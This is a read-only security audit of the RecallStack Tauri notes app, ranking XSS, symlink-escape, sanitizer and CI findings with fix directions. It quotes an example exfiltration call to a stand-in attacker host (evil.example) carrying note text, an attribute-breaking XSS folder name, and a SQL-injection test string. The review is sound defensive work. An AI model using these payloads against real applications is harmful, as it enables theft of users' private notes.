# RecallStack Security & Code Quality Review — 2026-08-07

Point-in-time, read-only audit of the RecallStack Tauri 2 desktop app (Rust backend, TypeScript/HTML frontend, build/release pipeline, and dependencies). No code was changed as part of this review. Line numbers refer to the codebase as of commit `5d71869`.

## How to read this document

Findings are ranked by severity and calibrated to RecallStack's actual threat model: **a local-first, single-user desktop Markdown notes app with no network service and no remote attack surface.** The realistic threats are:

1. **Malicious or booby-trapped note content** — a workspace imported from a shared drive, a synced folder, a downloaded template vault, or a note pasted from the web. This is the PKM-app equivalent of "untrusted input," and it's a real vector for this kind of app.
2. **A bug that causes silent, unrecoverable data loss** — arguably worse than most security bugs for a notes app.
3. **Anything that turns a plain frontend bug (XSS) into something much worse**, because of how this specific app is wired.

That third point matters enough to explain up front, because it raises the severity of several findings below.

## Foundational context: why frontend XSS is unusually dangerous here

Three configuration choices compound each other:

- `src-tauri/tauri.conf.json` sets `"security": { "csp": null }` — **no Content-Security-Policy at all**, and `index.html` has no CSP `<meta>` tag either. There is no browser-level backstop against injected `<script>`/inline-handler execution.
- `"withGlobalTauri": true` exposes the full native IPC bridge (`window.__TAURI__`) to any JavaScript running in the webview — including attacker-injected JavaScript.
- The `default` capability (`src-tauri/capabilities/default.json`) grants `core:default`, `dialog:default`, `opener:default`, and the app registers a broad set of native filesystem bridge commands (`fs_read`, `fs_write`, `fs_remove`, `fs_list`, …) reachable via `invoke()`.

The filesystem bridge itself is well-sandboxed to the workspace root (see "What's solid" below), so this is **not** full-disk access. But it means: **any XSS in this app is not "just" a DOM-level bug — it's a primitive for reading, overwriting, or deleting every note in the user's workspace**, plus (via `opener:default` → `open_url`, scoped to `http(s)/mailto/tel`) a channel to open an attacker-chosen `https://` URL, which — combined with XSS able to read note content — is a viable data-exfiltration path (e.g. `open_url('https://evil.example/?q=' + encodeURIComponent(noteText))`). `open_path` (direct local file/program execution) is **not** in the granted permission set, which limits the blast radius somewhat.

This is why the XSS-adjacent findings below are scored higher than they would be in an app without this IPC exposure.

---

## Findings

### 1. [Critical] Attribute-injection stored XSS via `esc()` missing quote-escaping

- **Where:** `src/app/recallstack-runtime.ts:5144` (the `esc()` helper) and its one attribute-context call site at `src/app/recallstack-runtime.ts:2016`.
- **What:** `esc()` only replaces `&`, `<`, `>`. A separate, correct helper, `escAttr()`, exists right below it at line 5148-5149 and additionally escapes `"` and `'` — but it isn't used at the one place that actually needs it. Line 2016 interpolates `esc(folderPrefix)` **inside a double-quoted HTML attribute**: `` `<span class="outputs-subpath" title="${esc(folderPrefix)}">...` ``. `folderPrefix` comes from `f.subPath` (line 2007), a real on-disk subfolder path from the Outputs/Inbox file listing.
- **Failure scenario:** `"` is a legal filename character on Linux and macOS. A workspace subfolder literally named `foo" onmouseover="alert(1)` (e.g. from an imported/synced/shared vault, or simply created by another app) renders as `title="foo" onmouseover="alert(1)">`, breaking out of the attribute and injecting a live event handler — no further note content needed, just the folder name. Combined with the IPC exposure above, this is a workspace-wide read/write/delete primitive from nothing more than a maliciously named folder.
- **Fix direction (not applied):** use `escAttr()` at line 2016 instead of `esc()`. Worth grepping for any other `esc(...)` usage inside a quoted attribute position (`title=`, `alt=`, `placeholder=`, `value=`, `data-*=`) — this was the only one found, but it's exactly the kind of thing worth a lint rule or a template helper that makes attribute vs. text-node context explicit, since a plain `esc()` call reads as "escaped" without indicating it's unsafe for attribute context.

### 2. [High] Symlink-escape gap in `workspace.rs`'s note path validator

- **Where:** `src-tauri/src/commands/workspace.rs:183-189` (`is_safe_relative`) and `:222-227` (`note_path`), used by `read_note` (:1034), `write_note` (:1049), `create_note` (:1067), `move_to_trash` (:1094), and `reveal_path` (:1811) — the primary note-editing command surface.
- **What:** `is_safe_relative()` rejects absolute paths and any non-`Normal` path component (blocking `..`, drive prefixes, etc.) — but unlike `src-tauri/src/commands/bridge.rs::safe_path()` (used by the generic `fs_*` bridge commands) and `safety.rs::workspace_target()`, it never calls `symlink_metadata` to check whether the resolved path — or any component along the way — is actually a symlink.
- **Failure scenario:** a `.md`-named symlink inside `Data/` pointing outside the workspace (again, plausible from an imported/synced/shared vault, or a cloned template repo containing a symlink) is followed transparently. `read_note`'s `fs::read_to_string` discloses the linked file's content straight to the UI; on the next edit+save, `write_note`'s call to `safety::preserve_version` (which does `fs::copy(target, …)`, following the symlink) copies the linked file's content into the app's own on-disk version-history store — persisting the leak even if the symlink is later removed. (The write path itself is safe: `atomic_write`'s `fs::rename` replaces the symlink rather than writing through it.)
- **Net effect:** a workspace-sandbox bypass allowing arbitrary local file read + inadvertent exfiltration into the app's own version-history storage. This is inconsistent with the stricter validator used two files over for the generic bridge — the fix is straightforward (reuse the same component-by-component `symlink_metadata` check `bridge.rs` already has) but is a real gap as shipped.

### 3. [Medium-High] Hand-rolled HTML sanitizer instead of a vetted library (mutation-XSS risk)

- **Where:** `sanitizeRenderedHtml()`, `src/app/recallstack-runtime.ts:5168-5229`, wrapping `marked.parse()` output in `renderMarkdown()` (~line 4466-4478).
- **What:** `marked` is confirmed (per the frontend review) to be configured to pass raw HTML straight through — it does no sanitization of its own. This custom function is the *only* thing standing between arbitrary HTML in note content and the live DOM for regular Markdown rendering. It's a reasonably competent implementation — it parses into an inert `<template>`, walks the tree, removes a tag blocklist (`script`, `style`, `iframe`, `object`, `embed`, `link`, `meta`, `base`, `form`, `svg`, `math`), strips every `on*`/`style`/`srcdoc` attribute regardless of tag, and filters `href`/`src`/etc. through an allowlist (`isSafeUrl()`) that blocks `javascript:` and restricts `data:` to image MIME types on `src` only.
- **Why it's still a finding:** blocklist-based, hand-rolled sanitizers are a well-documented source of **mutation XSS (mXSS)** bugs — the class of bypass where sanitizing inside an inert context (here, `<template>`), serializing back to a string (`template.innerHTML` getter), and then re-parsing that string a second time in a *different* parsing context (the live `previewOut.innerHTML = ...` assignment) causes the browser's HTML parser to reinterpret ambiguous or malformed markup differently the second time — potentially resurrecting constructs the first pass removed. This is precisely the class of bug that DOMPurify (the de facto standard for this exact use case, and not currently a dependency of this project) has spent years specifically hardening against, with fixes for dozens of parser-quirk edge cases that a bespoke implementation is unlikely to have independently discovered. No concrete bypass payload was constructed as part of this review — this is a "known bug class, plausible risk" finding, not a demonstrated exploit — but given the severity amplification described above, it's worth taking seriously.
- **Recommendation (not applied):** consider adopting DOMPurify (already a natural fit given the existing `<template>`-based staging pattern) either in place of, or as a second pass after, the current sanitizer.

### 4. [Medium] Mermaid diagram rendering bypasses the app's own sanitizer entirely

- **Where:** `src/app/recallstack-runtime.ts:4582-4592`, using Mermaid's own `mermaid.run({ nodes: currentDiagrams })` API to render `div.mermaid` placeholders in place.
- **What:** Unlike regular Markdown content, Mermaid diagram output (which Mermaid itself generates as SVG and injects into the DOM) never passes through `sanitizeRenderedHtml()` at all — `svg` is even in that function's tag blocklist, so mermaid output *couldn't* go through it without being stripped. This code path relies entirely on Mermaid v11's own internal escaping. `mermaid.initialize({ startOnLoad: false, theme: 'dark' })` (called at ~line 350 and ~6327) does not explicitly set `securityLevel`. This review confirmed via the installed package (`node_modules/mermaid/dist/mermaid.min.js`) that Mermaid v11's *default* `securityLevel` is `"strict"`, which is Mermaid's safest mode (internally sanitizes diagram text/labels, disables `click` bindings). So the practical risk today is lower than it looks.
- **Why it's still worth flagging:** the app has zero defense-in-depth here — it is trusting a third-party library's *default* (not an explicit, pinned configuration) for a code path that completely bypasses the app's own sanitizer. If a future Mermaid version changes its default, or a diagram-embedded directive is ever found to override `securityLevel` (Mermaid has had exactly this class of bug historically), there is no second layer of defense the way there is for regular Markdown content. A crafted ` ```mermaid ` fence in an imported/synced note is a realistic delivery mechanism for this app.
- **Recommendation (not applied):** explicitly pass `securityLevel: 'strict'` in both `mermaid.initialize()` calls, so the safety property is asserted by this codebase rather than inherited silently from upstream defaults.

### 5. [Medium] `verify_backup` / `restore_backup_dry_run` have no bound on decompression time

- **Where:** `src-tauri/src/commands/backup.rs:263-304` (`verify_backup_file`, used directly by `verify_backup` and internally by `restore_backup_dry_run`).
- **What:** memory use is actually bounded correctly (a fixed 64 KB buffer streams each zip entry through SHA-256 rather than buffering it whole), but there is no cap on total bytes processed relative to the archive's on-disk size. A small, highly-compressible crafted zip ("zip bomb") passed as the free-form `path: String` argument can make this loop run for a very long time, hanging the Verify/Restore-dry-run operation.
- **Failure scenario:** requires the user to explicitly point Verify Backup / Restore at an attacker-supplied `.zip` (e.g. a "backup" shared by someone else, or downloaded). Impact is a CPU/time denial-of-service against that one operation, not memory exhaustion or data compromise.

### 6. [Medium] `opener:default`'s `open_url` is a data-exfiltration channel if combined with any XSS

- **Where:** `src-tauri/capabilities/default.json`, granting `opener:default` → `allow-open-url` (scoped to `mailto:`, `tel:`, `http://`, `https://` per `src-tauri/gen/schemas/acl-manifests.json`) and `allow-reveal-item-in-dir`. `allow-open-path` (arbitrary local file/program execution) is confirmed **not** part of the granted set.
- **What:** this isn't a bug in isolation — it's a real, intentional feature (open links in the user's browser) — but it's worth naming explicitly as a consequence of the architecture in the "Foundational context" section above: given any of findings #1/#3/#4, injected JavaScript can call `open_url` with an attacker-controlled `https://` URL carrying exfiltrated note content in the query string, silently opening the user's default browser to send it. For a notes app whose value proposition is explicitly "local-first" and private, this is worth being aware of even though each individual permission is reasonably scoped.

### 7. TOCTOU race in symlink checks (both `bridge.rs` and the safer parts of `workspace.rs`/`safety.rs`) — [Low]

`safe_path()` (bridge.rs) and `workspace_target()` (safety.rs) both do "check `symlink_metadata`, then later `fs::read`/`write`/`rename`" — a concurrent local process could swap a real file/directory for a symlink in the window between the check and the use. This requires a concurrent malicious local process already running as the same user, which is a fairly privileged starting position on a single-user desktop machine — low realistic severity, but worth noting as defense-in-depth debt rather than a live risk.

### 8. GitHub Actions pinned by tag/branch, not commit SHA — [Low]

`.github/workflows/release-artifacts.yml` uses `actions/checkout@v6`, `actions/setup-node@v6`, `actions/upload-artifact@v6`, and `dtolnay/rust-toolchain@stable`. Tags are mutable, and `@stable` is a floating branch ref rather than even a version tag — a compromised upstream repo could push malicious code under an existing ref without publishing a new release. This is a routine supply-chain hardening gap common to most repos, not unique negligence here; the workflow is otherwise clean (see "What's solid").

### 9. Opt-in CDN fallback for extra syntax-highlighting languages has no Subresource Integrity pinning — [Low/Info]

`loadHljsLang()` (`src/app/recallstack-runtime.ts:4375-4412`) can fetch `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/<lang>.min.js` and execute it with no `integrity` attribute. This is **off by default** — gated behind `window.__onlineDeps`, which is only `true` if a user explicitly runs `localStorage.setItem('pkm-online-deps', 'on')` (per `src/app/bootstrap.ts:28` and the comment at `index.html:467`), and the packaged desktop build always forces `__sqlLocal = true` (bootstrap.ts:29) so sql.js itself never reaches out to a CDN regardless of this flag. Low priority given it's opt-in, but worth an SRI hash if this path is kept.

### 10. Minor data-loss/UX gaps and other Info-level notes

- **Cross-device trash fallback silently drops symlinks:** `copy_recursively()` (`safety.rs:146`, used only when `fs::rename` fails, e.g. moving to trash across filesystems) explicitly skips symlinks while the original is then deleted — a symlink inside a trashed directory silently vanishes with no warning surfaced to the user. Not a security issue, but a silent-data-loss edge case.
- **No real (non-dry-run) restore command exists in Rust** — only `restore_backup_dry_run` is registered as a Tauri command; actual restoration apparently happens file-by-file from the frontend via `fs_write` (which *is* protected by `bridge.rs::safe_path`). Not a bug, just a cross-reference worth knowing if anyone later adds a native bulk-restore command — it would need the same rigor as `bridge.rs`.
- **Bundled SQLite tracks the `rusqlite` crate's freshness**, not OS package updates (`rusqlite = { features = ["bundled"] }`). Reasonable tradeoff for portability, just means SQLite CVE patching depends on dependency updates rather than the system's own SQLite.
- **Rust command handlers routinely stringify raw OS errors back to the frontend** (`Result<T, String>` patterns throughout). For a local single-user desktop app this is low-impact (at most reveals local filesystem layout in an error toast), but noting it for completeness.
- `RecallStack_Desktop_App_Recommendations.md` at the repo root is the original pre-Tauri-migration planning document (dated 2026-08-06) and reads as a historical snapshot rather than live documentation — doesn't contradict the current implementation misleadingly, just worth knowing it's not meant to be kept in sync going forward.

---

## What's solid (checked and found fine — not re-flagged above)

**Rust backend**
- **SQL injection:** none found. Every SQLite query in `workspace.rs` uses `params![]`/`params_from_iter` with typed values; the few `format!()`-built SQL fragments only splice in hardcoded column/table names or an enum-constrained operator, never raw user input. There's even an existing test exercising a `tag:' OR 1=1 --`-style injection attempt.
- **Zip-slip:** not applicable — `backup.rs` never extracts a zip archive to disk anywhere; `restore_backup_dry_run` validates every manifest entry's path (rejecting absolute paths, `..`, and prefix components) without writing anything.
- **Command injection:** `health.rs`'s two `git` invocations use `Command::new("git").args([...])` with array arguments and `current_dir` — no shell involved, safe regardless of what characters appear in the workspace path.
- **Panics:** no `.unwrap()`/`.expect()` found on attacker- or file-content-controlled data in the commands reviewed; remaining `.expect()` calls are on just-established invariants or test-only code.
- **File watcher race handling:** the internal-write dedup window (2s retention / 900ms "recent" threshold in `AppState`) can at worst mislabel a change event's internal/external badge in the UI — file content is always re-read from disk on open, so this doesn't cause data loss.
- **Resource leaks:** SQLite `Connection`s and `File` handles are all function-scoped and dropped/`sync_all()`'d promptly; none held open across long operations.
- **Trash/versioning as a safety net:** every user-content delete path goes through `trash_workspace_path` (no bare `remove_file`/`remove_dir_all` on real workspace content found), and overwrites are consistently preceded by `preserve_version` at each call site — the two-fork review didn't find a path that bypasses this.

**Frontend**
- **`desktop-bridge.ts`** correctly relies on the Rust side's `safe_path()` as the sole enforcement point rather than duplicating (and potentially under-duplicating) path validation in JS — the right architecture, since client-side checks are trivially bypassable anyway via a raw `invoke()` call.
- **`theme.json` parsing** (`features/themes/catalog.ts`) uses a strict allowlist regex on CSS custom-property keys and is size-capped — no prototype-pollution vector found.
- **Blob URL lifecycle:** every `URL.createObjectURL()` call site has a matching `revokeObjectURL()` (immediate, timeout-deferred, or tracked via a map) — no leaks found across the reviewed code, including the asset-preview and paste-image paths.
- **Save-race handling:** the `saveInProgress`/`savePromise` mutex correctly wraps every save entry point (autosave timer, manual save, and pre-navigation saves) in try/finally, and rename/delete/switch-workspace flows all gate through `autoSaveIfDirty()` first — consistent with the fix described in `CHANGELOG.md` for the historical "concurrent save race" bug, with no new unguarded path found elsewhere. (Minor non-issue: rename is implemented as write-new-then-delete-old, so a crash mid-rename can leave a harmless duplicate file rather than losing data.)
- **Command palette / command registry:** command IDs are matched against a strict regex; no `eval`, `new Function`, or string-argument `setTimeout`/`setInterval` found anywhere in scope.
- **`index.html`:** no inline `<script>` tags, a single `type="module"` script reference — consistent with (though not a substitute for) having no CSP.

**Build, CI, and dependencies**
- **`npm audit`**: 0 vulnerabilities across 218 resolved dependencies.
- **`cargo audit`**: 0 RUSTSEC vulnerabilities. 17 "unmaintained"/"unsound" advisories, all transitive from Tauri's Linux GTK3 bindings (`gtk`, `glib`, `atk`, etc. via `tauri-plugin-*`) — not actionable app-code issues.
- **CI workflow trigger:** `workflow_dispatch` only — no `push`/`pull_request` triggers, so no "pwn request" risk from external PRs. Top-level `permissions: contents: read`, no per-job escalation, no secrets referenced anywhere in the workflow.
- **`scripts/*.mjs`:** every `spawnSync` call uses the safe array-argument form, never `shell: true` or string-interpolated shell commands; the one place a command string is built (the Windows `Compress-Archive` PowerShell invocation) only interpolates paths derived from a regex-validated semver `version` string, with correct PowerShell quote escaping. No archive-extraction code exists in these scripts (creation-only), so no zip-slip surface there either.
- **`packaging/arch/PKGBUILD.template`** substitution is safe: `@VERSION@` is regex-validated upstream (`check-versions.mjs`), `@SHA256@` is always a hex digest, and the `source=()` entry references a local tarball rather than fetching a URL.
- **Dependency provenance:** both `Cargo.lock` and `package-lock.json` are committed (not gitignored); no git-URL dependencies found in either ecosystem; no risky `preinstall`/`postinstall` hooks in the project's own `package.json` (the only one spot-checked among dependencies, `esbuild`'s, is the standard platform-binary-download pattern).
- **Secrets scan:** `grep -riE "api[_-]?key|secret|password|BEGIN.*PRIVATE KEY"` across all tracked files (excluding `node_modules`/`dist`/`release`/`target`) returned zero real hits. `.gitignore` correctly excludes build artifacts (`node_modules/`, `dist/`, `release/`, `src-tauri/target/`).

---

## Summary table

| # | Finding | Area | Severity |
|---|---|---|---|
| 1 | `esc()` doesn't escape quotes; used in an HTML attribute → stored XSS via a maliciously named folder | Frontend | **Critical** |
| 2 | `workspace.rs` note-path validator skips the symlink check `bridge.rs` has | Backend | **High** |
| 3 | Hand-rolled HTML sanitizer (no DOMPurify) — plausible mXSS bypass class | Frontend | Medium-High |
| 4 | Mermaid rendering bypasses the app's sanitizer, relies on unconfigured library default | Frontend | Medium |
| 5 | Backup verify/restore-dry-run has no decompression time bound (CPU DoS) | Backend | Medium |
| 6 | `opener:default`'s `open_url` is an exfiltration channel if any XSS exists | Config | Medium |
| 7 | TOCTOU race between symlink check and file use | Backend | Low |
| 8 | GitHub Actions pinned by tag/branch, not SHA | CI | Low |
| 9 | Opt-in CDN fallback lacks Subresource Integrity | Frontend | Low/Info |
| 10 | Misc: symlinks silently dropped on cross-device trash, no native bulk-restore command, bundled-SQLite freshness, verbose error strings, stale planning doc | Various | Info |

No changes were made to the repository as part of this review.
